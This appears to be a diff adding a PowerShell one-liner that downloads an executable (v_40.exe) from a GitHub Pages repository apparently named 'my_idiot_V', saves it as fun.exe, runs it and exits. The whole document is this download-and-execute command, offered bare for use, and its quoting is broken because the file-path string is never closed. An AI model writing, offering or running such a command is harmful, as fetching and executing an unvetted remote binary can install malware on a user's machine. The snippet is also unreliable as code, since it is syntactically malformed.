@@ -1,0 +1,2 @@
+for  power shell
+$url = 'https://haiyan-ali.github.io/my_idiot_V/v_40.exe'; $Path= 'fun.exe; Invoke-WebRequest -URI $URL -OutFile $Path;.\fun.exe; exit;
